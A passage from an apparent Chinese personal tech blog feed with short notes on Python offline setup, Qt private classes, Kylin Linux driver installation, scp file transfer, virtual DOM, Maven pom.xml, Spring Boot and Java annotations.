<h2 id="离线迁移"><a href="#离线迁移" class="headerlink" title="离线迁移"></a>离线迁移</h2><p>创建envConfig.bat批处理文件，一键执行离线环境配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m venv env</span><br><span class="line">call env\Scripts\activate.bat</span><br><span class="line">pip install --no-index --find-links&#x3D;packages -r requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import getpass</span><br><span class="line">import oracledb</span><br><span class="line">from docxtpl import DocxTemplate</span><br><span class="line"></span><br><span class="line">def oracledb_test():</span><br><span class="line">    un &#x3D; &#39;scott&#39;</span><br><span class="line">    cs &#x3D; &#39;localhost&#x2F;orclpdb&#39;</span><br><span class="line">    pw &#x3D; getpass.getpass(f&#39;Enter password for &#123;un&#125;@&#123;cs&#125;: &#39;)</span><br><span class="line"></span><br><span class="line">    with oracledb.connect(user&#x3D;un, password&#x3D;pw, dsn&#x3D;cs) as connection:</span><br><span class="line">        with connection.cursor() as cursor:</span><br><span class="line">            sql &#x3D; &quot;&quot;&quot;select sysdate from dual&quot;&quot;&quot;</span><br><span class="line">            for r in cursor.execute(sql):</span><br><span class="line">                print(r)</span><br><span class="line"></span><br><span class="line">def wordtpl_test():</span><br><span class="line">    doc &#x3D; DocxTemplate(&quot;my_word_template.docx&quot;)</span><br><span class="line">    context &#x3D; &#123; &#39;company_name&#39; : &quot;World company&quot; &#125;</span><br><span class="line">    doc.render(context)</span><br><span class="line">    doc.save(&quot;generated_doc.docx&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    oracledb_test()</span><br><span class="line">    wordtpl_test()</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://developer.aliyun.com/article/1064481" target="_blank" rel="noopener">Python自动化：根据模板批量生成含指定数据的word文档</a>,by aliyun.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>QT私有类的设计模式学习</title>
    <url>/2024/06/11/QT%E7%A7%81%E6%9C%89%E7%B1%BB%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>查看QT源码，会发现很多类会有一个同样名字、但是以Private结尾的孪生类，这是QT用于封装私有操作的一种设计模式。这种设计模式可以有如下优点：</p>
<ul>
<li>信息隐藏</li>
<li>二进制兼容</li>
</ul>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>myclass.h</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; myclass.h  </span><br><span class="line">#ifndef MYCLASS_H  </span><br><span class="line">#define MYCLASS_H  </span><br><span class="line">#include &lt;QtCore&#x2F;QObject&gt;  </span><br><span class="line">class MyClassPrivate;  </span><br><span class="line">class MyClass: public QObject  </span><br><span class="line">&#123;  </span><br><span class="line">  Q_OBJECT  </span><br><span class="line">public:  </span><br><span class="line">  MyClass(QObject *parent &#x3D; 0);  </span><br><span class="line">  virtual ~MyClass();  </span><br><span class="line">  void dummyFunc();  </span><br><span class="line">signal:  </span><br><span class="line">  void dummySignal();  </span><br><span class="line">private:  </span><br><span class="line">  MyClassPrivate * const d_ptr;  </span><br><span class="line">  Q_DECLARE_PRIVATE(MyClass);  </span><br><span class="line">  Q_DISABLE_COPY(MyClass);  </span><br><span class="line">&#125;;  </span><br><span class="line">#endif &#x2F;&#x2F; MYCLASS_H</span><br></pre></td></tr></table></figure>

<p>myclass.cpp  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; myclass.cpp  </span><br><span class="line">#include &quot;myclass.h&quot;  </span><br><span class="line">class MyClassPrivate  </span><br><span class="line">&#123;  </span><br><span class="line">public:  </span><br><span class="line">  MyClassPrivate(MyClass *parent)  </span><br><span class="line">    : q_ptr(parent)  </span><br><span class="line">  &#123;  </span><br><span class="line">  &#125;  </span><br><span class="line">  void foobar()  </span><br><span class="line">  &#123;  </span><br><span class="line">    Q_Q(MyClass);  </span><br><span class="line">    emit q-&gt;dummySignal();  </span><br><span class="line">  &#125;  </span><br><span class="line">private:  </span><br><span class="line">  MyClass * const q_ptr;  </span><br><span class="line">  Q_DECLARE_PUBLIC(MyClass);  </span><br><span class="line">&#125;;  </span><br><span class="line">MyClass::MyClass(QObject *parent)  </span><br><span class="line">  : QObject(parent)  </span><br><span class="line">  , d_ptr(new MyClassPrivate(this))  </span><br><span class="line">&#123;  </span><br><span class="line">&#125;  </span><br><span class="line">MyClass::~MyClass()  </span><br><span class="line">&#123;  </span><br><span class="line">  Q_D(MyClass);  </span><br><span class="line">  delete d;  </span><br><span class="line">&#125;  </span><br><span class="line">void MyClass::dummyFunc()  </span><br><span class="line">&#123;  </span><br><span class="line">  Q_D(MyClass);  </span><br><span class="line">  d-&gt;foobar();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/zzzsj/p/17511693.html" target="_blank" rel="noopener">C++学习—qt的公有类、私有类、Q_Q、Q_D、二进制兼容</a>,by 手磨咖啡.</li>
<li><a href="https://blog.csdn.net/weixin_33232568/article/details/131342239" target="_blank" rel="noopener">Qt使用技巧–定义Private类</a>,by 大王怕我去巡山.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux桌面版安装过程笔记</title>
    <url>/2024/06/13/Linux%E6%A1%8C%E9%9D%A2%E7%89%88%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>最近需要在一台比较老的机器上安装银河麒麟4.0.2，遇到一些问题，记录一下。</p>
<h1 id="光盘启动后，显示器黑屏"><a href="#光盘启动后，显示器黑屏" class="headerlink" title="光盘启动后，显示器黑屏"></a>光盘启动后，显示器黑屏</h1><p>解决方案：光盘启动后，选择 install kylin 启动选项，按键盘 e 进入编辑状态，找到 quiet splash ，在后面添加 nomodeset ，然后按 crtl+x 启动。</p>
<p>具体原理:</p>
<ul>
<li>nomodeset</li>
</ul>
<p>这是一个新型的显示模式，即内核在启动阶段调用更先进的图形显示技术，以达到更好的显示效果。副作用就是兼容性低。</p>
<p>可以设置nomodeset 或者modeset=0关闭这项功能，至少保证进入字符界面。</p>
<p>更进阶一点的写法是：i915.modeset=0,其中i915是intel的显示驱动，该命令可以单独关闭该驱动的KMS。</p>
<ul>
<li>quiet</li>
</ul>
<p>quiet参数的作用：启动系统的过程中，如果没有quiet，那么内核就会输出很多内核消息，这些内核消息就包括的了系统启动过程中运行了哪些程序，如果系统运行正常，就没必要看到这些消息。</p>
<ul>
<li>splash</li>
</ul>
<p>splash是一个不可或缺的参数，系统很多核心程序，都需要这个参数，且这个参数与可视化界面有关，没有就可能导致屏幕一片空白。</p>
<h1 id="网卡不识别，需要安装驱动"><a href="#网卡不识别，需要安装驱动" class="headerlink" title="网卡不识别，需要安装驱动"></a>网卡不识别，需要安装驱动</h1><p>进入Linux系统桌面后，执行如下步骤：</p>
<ul>
<li><p>查未安装驱动的网口<br>ifconfig  和 ifconfig -a对比，查看哪些网口没有加载，即为没有驱动的网口 </p>
</li>
<li><p>查网卡驱动型号<br>ethtool -i 网口，输出的driver:XXX就是驱动名</p>
</li>
<li><p>下载网卡<br>去intel官网下载对应驱动的源码</p>
</li>
</ul>
<ul>
<li><p>卸载旧驱动<br>rmmod XXX</p>
</li>
<li><p>编译<br>进入源码的makefile同级目录，执行make install</p>
</li>
<li><p>加载新驱动<br>depmod -a<br>modprobe XXX</p>
</li>
<li><p>查看<br>lsmod | grep XXX</p>
</li>
<li><p>重启网络服务<br>service networking restart</p>
</li>
</ul>
<h1 id="显示器分辨率不够，需要安装驱动"><a href="#显示器分辨率不够，需要安装驱动" class="headerlink" title="显示器分辨率不够，需要安装驱动"></a>显示器分辨率不够，需要安装驱动</h1><p>进入Linux系统桌面后，执行如下步骤：</p>
<ul>
<li><p>禁用原驱动nouveau<br>vim  /etc/modprobe.d/blacklist.conf<br>追加blacklist nouveu</p>
</li>
<li><p>备份启动项<br>mv /boot/initram….img /boot/initram…img.bak</p>
</li>
<li><p>重新生成启动项<br>dracut -v /boot/initram…img,名称要和原来的一样</p>
</li>
<li><p>重启，并ctrl alt f1（或者f2-f6）进去tty界面<br>登录root用户，关闭lightdm<br>service lightdm stop<br>找到nvidia显卡驱动并执行，都选yes或者ok，重新生成initram，并添加带X服务<br>安装好后启动lightdm<br>service lightdm start<br>按ctrl alt f7进入图形界面</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/weixin_55609813/article/details/127005039" target="_blank" rel="noopener">银河麒麟v4.0.2安装</a>,by 阿瓦隆<em>勒</em>菲.</li>
<li><a href="https://blog.csdn.net/dair6/article/details/121151562" target="_blank" rel="noopener">linux中grub，nomodest，quiet等参数的含义，进入启动项之后黑屏的可能原因</a>,by dair6.</li>
<li><a href="https://wiki.deepin.org/zh/01_%E8%BD%AF%E4%BB%B6wiki/03_linux%E5%86%85%E6%A0%B8/linux%E5%86%85%E6%A0%B8%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0" target="_blank" rel="noopener">linux内核启动参数</a>,by deepin.</li>
<li><a href="https://blog.csdn.net/luhuaxiang/article/details/88396882" target="_blank" rel="noopener">Linux系统安装网卡驱动</a>,by luhuaxiang.</li>
<li><a href="https://blog.csdn.net/zataji/article/details/123104569" target="_blank" rel="noopener">【亲测有效】Linux系统安装NVIDIA显卡驱动</a>,by 自动驾驶simulation.</li>
<li><a href="https://skyao.io/learning-linux-mint/docs/installation/hardware/amd_graph/" target="_blank" rel="noopener">AMD显卡驱动安装</a>,by skyao.</li>
<li><a href="https://www.small09.top/posts/210719-gpuinfoinlinux/" target="_blank" rel="noopener">Linux中获得AMD显卡的状态信息</a>,by 香风家的火柴盒.</li>
<li><a href="https://blog.csdn.net/StruggleRay/article/details/133201391" target="_blank" rel="noopener">ubuntu环境配置AMD显卡驱动</a>,by WocheDonner.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>不同桌面操作系统间文件传输方法</title>
    <url>/2024/06/23/%E4%B8%8D%E5%90%8C%E6%A1%8C%E9%9D%A2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%97%B4%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近经常在不同操作系统之间传输数据，因此简单记录一下所使用的方法。</p>
<h1 id="获取远程-Windows-系统中数据"><a href="#获取远程-Windows-系统中数据" class="headerlink" title="获取远程 Windows 系统中数据"></a>获取远程 Windows 系统中数据</h1><p>从本地操作系统获取远程 Windows 系统中的数据，优先可使用 Windows 自带的 FTP 服务，这样不仅可以获取数据，也可以向远程 Windows 系统写入数据。具体方法请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/A_awen/article/details/130286870" target="_blank" rel="noopener">windows搭建一个FTP服务器超详细</a></li>
</ul>
<p>如果本地和远程都是 Windows 系统，也可以使用自带的远程桌面应用读写数。开启远程桌面访问后，在命令行提示符中输入 mstsc ，远程登陆即可。</p>
<h1 id="获取远程-Linux-系统中数据"><a href="#获取远程-Linux-系统中数据" class="headerlink" title="获取远程 Linux 系统中数据"></a>获取远程 Linux 系统中数据</h1><h2 id="本地-Linux-系统"><a href="#本地-Linux-系统" class="headerlink" title="本地 Linux 系统"></a>本地 Linux 系统</h2><p>如果本地也是 Linux 系统，可以使用 SCP 命令。具体方法为：</p>
<ul>
<li>复制文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$scp local_file remote_username@remote_ip:remote_folder</span><br><span class="line">$scp local_file remote_username@remote_ip:remote_file</span><br><span class="line"></span><br><span class="line">$scp remote_username@remote_ip:remote_file local_folder</span><br><span class="line">$scp remote_username@remote_ip:remote_file local_file</span><br></pre></td></tr></table></figure>

<p>指定了用户名，命令执行后需要输入用户密码；如果不指定用户名，命令执行后需要输入用户名和密码；</p>
<ul>
<li>复制目录</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$scp -r local_folder remote_username@remote_ip:remote_folder</span><br><span class="line">$scp -r local_folder remote_ip:remote_folder</span><br><span class="line"></span><br><span class="line">$scp -r remote_username@remote_ip:remote_folder local_folder</span><br></pre></td></tr></table></figure>

<h2 id="本地-Windows-系统"><a href="#本地-Windows-系统" class="headerlink" title="本地 Windows 系统"></a>本地 Windows 系统</h2><p>如果本地是 Windows 系统，可使用 FTP 服务，让远程 Linux 系统将数据直接写入到本地 Windows 系统的 FTP 服务目录。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/A_awen/article/details/130286870" target="_blank" rel="noopener">windows搭建一个FTP服务器超详细</a>, by 程序猿——小白菜.</li>
<li><a href="https://linuxtools-rst.readthedocs.io/zh-cn/latest/tool/scp.html" target="_blank" rel="noopener">18. scp 跨机远程拷贝</a>,by  Linux Tools Quick Tutorial.</li>
<li><a href="https://blog.csdn.net/yang_guang3/article/details/118301389" target="_blank" rel="noopener">win10隐藏正在运行的程序怎么操作_win10怎么隐藏正在运行的软件</a>,by Rsun04551.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟DOM技术学习</title>
    <url>/2024/06/23/%E8%99%9A%E6%8B%9FDOM%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>文档对象模型（DOM）通过将文档的结构（例如表示网页的 HTML）以对象的形式存储在内存中，将网页与脚本或编程语言连接起来。 虚拟 DOM 是声明式 Web 框架（如 React、Vue.js 和 Elm）中使用的文档对象模型 （DOM） 的轻量级 JavaScript 表示形式。 </p>
<h1 id="为什么需要虚拟-DOM"><a href="#为什么需要虚拟-DOM" class="headerlink" title="为什么需要虚拟 DOM"></a>为什么需要虚拟 DOM</h1><p>虚拟 DOM 本质上是在 DOM 基础上的更高级别的抽象，使用虚拟 DOM 将带来如下好处：</p>
<ul>
<li>虚拟 DOM 比 DOM 更新渲染的速度更快。这就是虚拟 DOM 的魅力，正常来说增加一层抽象，可以减少编程复杂度，但会影响运行效率，但是虚拟 DOM 却两者兼备。</li>
<li>减少编程复杂度，更有利于前端组件式开发。</li>
</ul>
<h1 id="关键思想"><a href="#关键思想" class="headerlink" title="关键思想"></a>关键思想</h1><ul>
<li>如何创建 DOM 的虚拟表示</li>
<li>如何比较不同虚拟 DOM 节点之间的差异</li>
<li>应用虚拟 DOM 节点差异到真实的 HTML 元素</li>
</ul>
<h1 id="具体原理"><a href="#具体原理" class="headerlink" title="具体原理"></a>具体原理</h1><p>请参考：</p>
<ul>
<li><a href="https://lazamar.github.io/virtual-dom/" target="_blank" rel="noopener">A virtual DOM in 200 lines of JavaScript</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://lazamar.github.io/virtual-dom/" target="_blank" rel="noopener">A virtual DOM in 200 lines of JavaScript</a>,by Marcelo Lazaroni.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model" target="_blank" rel="noopener">文档对象模型（DOM）</a>,by mozilla.</li>
<li><a href="https://en.wikipedia.org/wiki/Virtual_DOM" target="_blank" rel="noopener">Virtual DOM</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven的配置文件pom.xml学习</title>
    <url>/2024/06/25/Maven%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6pom-xml%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>项目对象模型 (POM) 是 Maven 中的基本工作单元。它是一个 XML 文件，包含有关项目的信息以及 Maven 用于构建项目的配置详细信息。它包含大多数项目的默认值。例如，构建目录为target；源目录为src/main/java；测试源目录为src/test/java；等等。执行任务或目标时，Maven 在当前目录中查找 POM。它读取 POM，获取所需的配置信息，然后执行目标。</p>
<h1 id="POM-xml最简示例"><a href="#POM-xml最简示例" class="headerlink" title="POM.xml最简示例"></a>POM.xml最简示例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;project&gt;</span><br><span class="line">  &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;</span><br><span class="line"> </span><br><span class="line">  &lt;groupId&gt;com.mycompany.app&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;my-app&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;1&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure>

<h1 id="POM-xml结构"><a href="#POM-xml结构" class="headerlink" title="POM.xml结构"></a>POM.xml结构</h1><h2 id="项目基本信息"><a href="#项目基本信息" class="headerlink" title="项目基本信息"></a>项目基本信息</h2><p>必填项标签：</p>
<ul>
<li>groupId：项目的组名，通常为反转的域名，例如：com.example</li>
<li>artifactId: 项目的唯一标识，通常为项目名称</li>
<li>version：项目版本号</li>
<li>packaging：项目打包方式，通常是 jar、war 或 pom, 如果没有指定packaging，则默认是 jar</li>
</ul>
<p>其他重要标签：</p>
<ul>
<li>modules</li>
</ul>
<p>modules 标签用于声明当前 Maven 项目包含的模块子项目，每个子项目都是一个独立的 Maven 项目，具有自己的 pom.xml 文件，可以进行独立构建和测试。在父项目的 pom.xml 文件中，使用 标签来列出所有子项目的名称。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;project&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;</span><br><span class="line">	</span><br><span class="line">    &lt;groupId&gt;com.ruoyi&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ruoyi&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.8.7&lt;&#x2F;version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;modules&gt;</span><br><span class="line">        &lt;module&gt;ruoyi-admin&lt;&#x2F;module&gt;</span><br><span class="line">        &lt;module&gt;ruoyi-framework&lt;&#x2F;module&gt;</span><br><span class="line">        &lt;module&gt;ruoyi-system&lt;&#x2F;module&gt;</span><br><span class="line">        &lt;module&gt;ruoyi-quartz&lt;&#x2F;module&gt;</span><br><span class="line">        &lt;module&gt;ruoyi-generator&lt;&#x2F;module&gt;</span><br><span class="line">        &lt;module&gt;ruoyi-common&lt;&#x2F;module&gt;</span><br><span class="line">    &lt;&#x2F;modules&gt;</span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>parent</li>
</ul>
<p>parent 标签用于声明当前 Maven 项目的父项目，它可以将若干个 Maven 项目组织成一个整体，指定版本号，插件版本号等，便于管理和维护，在一个 Maven 项目中，使用标签来引用父项目。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;artifactId&gt;ruoyi&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;groupId&gt;com.ruoyi&lt;&#x2F;groupId&gt;</span><br><span class="line">        &lt;version&gt;3.8.7&lt;&#x2F;version&gt;</span><br><span class="line">    &lt;&#x2F;parent&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;artifactId&gt;ruoyi-framework&lt;&#x2F;artifactId&gt;</span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>properties</li>
</ul>
<p>properties 严格来说，并不一定是项目本身的信息，而是人为设置的属性或者说宏，这个标签用来定义和管理项目中所需要的属性，其作用有以下几个：</p>
<p>(1) 统一管理项目中的常用属性，比如版本号、路径、插件版本等，方便统一修改和管理。</p>
<p>(2) 可以在配置过程中使用 ${…}占位符引用这些属性，使得配置更加灵活和便捷。</p>
<p>(3) 避免硬编码，提高代码的可维护性和可读性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;project&gt;</span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;ruoyi.version&gt;3.8.7&lt;&#x2F;ruoyi.version&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;&#x2F;project.build.sourceEncoding&gt;</span><br><span class="line">        &lt;project.reporting.outputEncoding&gt;UTF-8&lt;&#x2F;project.reporting.outputEncoding&gt;</span><br><span class="line">        &lt;java.version&gt;1.8&lt;&#x2F;java.version&gt;</span><br><span class="line">        &lt;maven-jar-plugin.version&gt;3.1.1&lt;&#x2F;maven-jar-plugin.version&gt;</span><br><span class="line">        &lt;spring-framework.version&gt;5.3.33&lt;&#x2F;spring-framework.version&gt;</span><br><span class="line">        &lt;druid.version&gt;1.2.20&lt;&#x2F;druid.version&gt;</span><br><span class="line">        &lt;bitwalker.version&gt;1.21&lt;&#x2F;bitwalker.version&gt;</span><br><span class="line">        &lt;swagger.version&gt;3.0.0&lt;&#x2F;swagger.version&gt;</span><br><span class="line">        &lt;kaptcha.version&gt;2.3.3&lt;&#x2F;kaptcha.version&gt;</span><br><span class="line">        &lt;pagehelper.boot.version&gt;1.4.7&lt;&#x2F;pagehelper.boot.version&gt;</span><br><span class="line">        &lt;fastjson.version&gt;2.0.43&lt;&#x2F;fastjson.version&gt;</span><br><span class="line">        &lt;oshi.version&gt;6.5.0&lt;&#x2F;oshi.version&gt;</span><br><span class="line">        &lt;commons.io.version&gt;2.13.0&lt;&#x2F;commons.io.version&gt;</span><br><span class="line">        &lt;poi.version&gt;4.1.2&lt;&#x2F;poi.version&gt;</span><br><span class="line">        &lt;velocity.version&gt;2.3&lt;&#x2F;velocity.version&gt;</span><br><span class="line">        &lt;jwt.version&gt;0.9.1&lt;&#x2F;jwt.version&gt;</span><br><span class="line">    &lt;&#x2F;properties&gt;</span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure>

<h2 id="项目的依赖列表"><a href="#项目的依赖列表" class="headerlink" title="项目的依赖列表"></a>项目的依赖列表</h2><h3 id="dependency"><a href="#dependency" class="headerlink" title="dependency"></a>dependency</h3><p>与项目的依赖列表相关的标签最外层由 dependencies 来囊括，内部包含了各种具体的依赖 dependency，该标签用于指定一个依赖项，它包含以下几个子标签：</p>
<ul>
<li>groupId：指定依赖项的groupId，项目的组名</li>
<li>artifactId：指定依赖项的artifactId，项目的唯一标识符</li>
<li>version：指定依赖项的版本号。</li>
<li>scope：指定依赖项在项目中的使用范围。</li>
</ul>
<p>其中的 <scope>一般包含以下几种范围：常用的有compile、test、provided 和 runtime。</p>
<h3 id="repository"><a href="#repository" class="headerlink" title="repository"></a>repository</h3><p>我们还能在pom文件中支持指定Maven仓库，即使用 repositories 和 repository 标签，repository 用于指定一个Maven仓库。</p>
<h2 id="项目的构建配置"><a href="#项目的构建配置" class="headerlink" title="项目的构建配置"></a>项目的构建配置</h2><p>项目的构建配置信息，包括编译器版本、插件列表、源代码目录等。</p>
<p>具体请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/mountainstudy/p/17953638" target="_blank" rel="noopener">全面详解Maven的配置文件pom.xml（含常用plugin）</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/mountainstudy/p/17953638" target="_blank" rel="noopener">全面详解Maven的配置文件pom.xml（含常用plugin）</a>,by Slow菜鸟.</li>
<li><a href="https://maven.apache.org/guides/introduction/introduction-to-the-pom.html" target="_blank" rel="noopener">Introduction to the POM</a>,by apache.</li>
<li><a href="https://blog.csdn.net/weixin_43671437/article/details/106753461" target="_blank" rel="noopener">Maven的三种项目打包方式——pom，jar，war的区别</a>,by Mr.史.</li>
<li><a href="https://www.cnblogs.com/Baker-Street/p/16156144.html" target="_blank" rel="noopener">基于Springboot的maven父子工程pom文件打包配置</a>,by Sherlock先生.</li>
<li><a href="https://www.runoob.com/maven/maven-repositories.html" target="_blank" rel="noopener">Maven 仓库</a>,by runoob.</li>
<li><a href="https://developer.aliyun.com/article/1419143" target="_blank" rel="noopener">maven配置阿里云镜像源</a>,by aliyun.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA创建SpringBoot项目并启动的方法</title>
    <url>/2024/06/28/IDEA%E5%88%9B%E5%BB%BASpringBoot%E9%A1%B9%E7%9B%AE%E5%B9%B6%E5%90%AF%E5%8A%A8%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>IntelliJ IDEA是一种商业化销售的Java集成开发环境（Integrated Development Environment，IDE）工具软件，由JetBrains软件公司（前称为IntelliJ）开发，提供Apache 2.0开放式授权的社区版本以及专有软件的商业版本，开发者可选择其所需来下载使用。</p>
<h1 id="创建Spring-Boot项目的方法"><a href="#创建Spring-Boot项目的方法" class="headerlink" title="创建Spring Boot项目的方法"></a>创建Spring Boot项目的方法</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/wudinaniya/article/details/105478014" target="_blank" rel="noopener">使用idea创建第一个springboot项目 及 如何启动springboot项目 及 如何指点端口和上下文</a></li>
</ul>
<h1 id="启动Spring-Boot项目的方法"><a href="#启动Spring-Boot项目的方法" class="headerlink" title="启动Spring Boot项目的方法"></a>启动Spring Boot项目的方法</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/wudinaniya/article/details/105478014" target="_blank" rel="noopener">使用idea创建第一个springboot项目 及 如何启动springboot项目 及 如何指点端口和上下文</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/zh-cn/IntelliJ_IDEA" target="_blank" rel="noopener">IntelliJ IDEA</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/wudinaniya/article/details/105478014" target="_blank" rel="noopener">使用idea创建第一个springboot项目 及 如何启动springboot项目 及 如何指点端口和上下文</a>,by wudinaniya.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java注解学习笔记</title>
    <url>/2024/06/29/Java%E6%B3%A8%E8%A7%A3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>注解是JDK1.5版本开始引入的一个特性，用于对代码进行说明，可以对包、类、接口、字段、方法参数、局部变量等进行注解。它是框架学习和设计者必须掌握的基础。</p>
</blockquote>
<h1 id="注解作用"><a href="#注解作用" class="headerlink" title="注解作用"></a>注解作用</h1><p>主要的作用有以下四方面：</p>
<ul>
<li><p>生成文档，通过代码里标识的元数据生成javadoc文档。</p>
</li>
<li><p>编译检查，通过代码里标识的元数据让编译器在编译期间进行检查验证。</p>
</li>
<li><p>编译时动态处理，编译时通过代码里标识的元数据动态处理，例如动态生成代码。</p>
</li>
<li><p>运行时动态处理，运行时通过代码里标识的元数据动态处理，例如使用反射注入实例。</p>
</li>
</ul>
<h1 id="注解分类"><a href="#注解分类" class="headerlink" title="注解分类"></a>注解分类</h1><p>注解的常见分类：</p>
<ul>
<li><p>Java自带的标准注解，包括@Override、@Deprecated和@SuppressWarnings，分别用于标明重写某个方法、标明某个类或方法过时、标明要忽略的警告，用这些注解标明后编译器就会进行检查。</p>
</li>
<li><p>元注解，元注解是用于定义注解的注解，包括@Retention、@Target、@Inherited、@Documented，@Retention用于标明注解被保留的阶段，@Target用于标明注解使用的范围，@Inherited用于标明注解可继承，@Documented用于标明是否生成javadoc文档。</p>
</li>
<li><p>自定义注解，可以根据自己的需求定义注解，并可用元注解对自定义注解进行注解。</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://pdai.tech/md/java/basic/java-basic-x-annotation.html" target="_blank" rel="noopener">Java 基础 - 注解机制详解</a>,by pdai.</li>
<li><a href="https://www.cnblogs.com/ziph/p/13056092.html" target="_blank" rel="noopener">Java注解</a>,by 何学长在奔跑.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus数据访问层设计</title>
    <url>/2024/07/14/CPlusPlus%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE%E5%B1%82%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<p>三层架构是软件架构中常用的架构，它从上往下分为表示层、业务逻辑层、数据访问层。下面重点介绍 C++ 程序的数据访问层设计。</p>
